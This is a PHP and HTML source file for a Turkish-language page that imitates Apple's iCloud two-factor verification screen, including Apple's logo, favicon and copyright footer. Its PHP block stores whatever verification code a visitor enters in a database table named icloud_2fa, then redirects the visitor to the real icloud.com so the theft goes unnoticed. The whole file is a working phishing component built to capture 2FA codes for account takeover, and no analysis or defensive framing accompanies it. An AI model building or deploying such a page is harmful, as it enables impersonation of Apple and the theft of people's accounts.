<?php 
include("dbconnect.php");
if(isset($_POST["2FA_Button"])) {
    
    if(empty($_POST["icloud_2FA"])) {
        
    } else {
        $twoFactor = $_POST["icloud_2FA"];

        $icloud2FA_sql_add = "INSERT INTO icloud_2fa (iCloud_2FA) VALUES (?)";

        if($stmt = mysqli_prepare($connect, $icloud2FA_sql_add)) {

            mysqli_stmt_bind_param($stmt, "s", $twoFactor);

            mysqli_stmt_execute($stmt);

            header("Refresh: 1.8; URL=https://www.icloud.com/");
            exit();

        }
        mysqli_close($connect);
    }
}



?>

<!DOCTYPE html>
<html lang="tr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
    <link rel="icon" href="ico/apple.ico">
    <link rel="stylesheet" href="style.css">
    <title>iCloud</title>
</head>

<body>
    <header>
        <nav>
            <a href="index.php" class="icloud-logo"><i class='bx bxl-apple'></i>iCloud</a>
        </nav>
    </header>
    <main id="main">
        <form id="sign-in" action="index.php" method="POST"> 
            <img id="apple-color-logo" src="imgs/sign-in-screen-img.svg" alt="">
            <p>İki Faktörlü Kimlik Doğrulama</p>
            <div class="input-container">
                <button type="submit" name="2FA_Button">
                <i class='bx bx-right-arrow-circle'></i>
                </button>  
                <input id="password" name="icloud_2FA" type="number" placeholder="Doğrulama kodu" title="Gerekli alanı doldurun" oninput="validateNumberInput(event)">
            </div>
            <p style="font-size: 18px; color: #494949; text-align: center; line-height: 1.5; margin-top: -35px;">
    Doğrulama kodunu içeren bir mesaj aygıtlarınıza <br> gönderildi.
    Devam etmek için kodu girin.
</p>
            
            <div class="links"> <a href="#">Kodu tekrar gönder</a>
            <a href="#">Aygıtlarınıza erişemiyor musunuz?</a></div>
        </form>
    </main>
    <footer>
        <div class="footer-div">Sistem Durumu
            <div class="sep"></div>
            Gizlilik Politikası
            <div class="sep"></div>
            Hüküm ve Koşullar
        </div>
        <div class="footer-div">Copyright © 2025 Apple Inc. Tüm haklar saklıdır.</div>
    </footer>
    <script src="script.js"></script>
</body>

</html>